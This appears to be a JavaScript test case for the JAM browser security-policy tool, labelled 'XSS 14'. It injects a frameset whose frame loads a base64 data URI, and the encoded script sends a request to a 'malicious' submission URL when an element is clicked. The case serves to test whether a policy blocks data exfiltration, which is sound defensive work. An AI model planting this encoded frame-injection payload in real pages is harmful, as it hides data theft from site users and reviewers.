
JAM.startProfile('load');
introspect(JAM.policy.pFull) {
function exfiltrate_key_history() {

    // XSS 14 - Frameset + Frame Source + Data Directive - No Obfuscation
    // Exfiltrate data using XMLHTTP request
    // Decoded value: <script>xmlhttp=new XMLHttpRequest();xmlhttp.open("GET", "http://blackoutjack.com/malicious/submission?test=xss14", true);xmlhttp.send(null);</script>
    var script = document.createElement("frameset");
	var script2 = document.createElement("frame");
    script2.src = 'data:text/html;charset=utf-8;base64,PHNjcmlwdD54bWxodHRwPW5ldyBYTUxIdHRwUmVxdWVzdCgpO3htbGh0dHAub3BlbigiR0VUIiwgImh0dHA6Ly9ibGFja291dGphY2suY29tL21hbGljaW91cy9zdWJtaXNzaW9uP3Rlc3Q9eHNzMTQiLCB0cnVlKTt4bWxodHRwLnNlbmQobnVsbCk7PC9zY3JpcHQ+Cg==';
	script.appendChild(script2);
	document.getElementsByTagName('body')[0].appendChild(script);
	
}

document.getElementById('test').onclick = exfiltrate_key_history;

}

JAM.stopProfile('load');
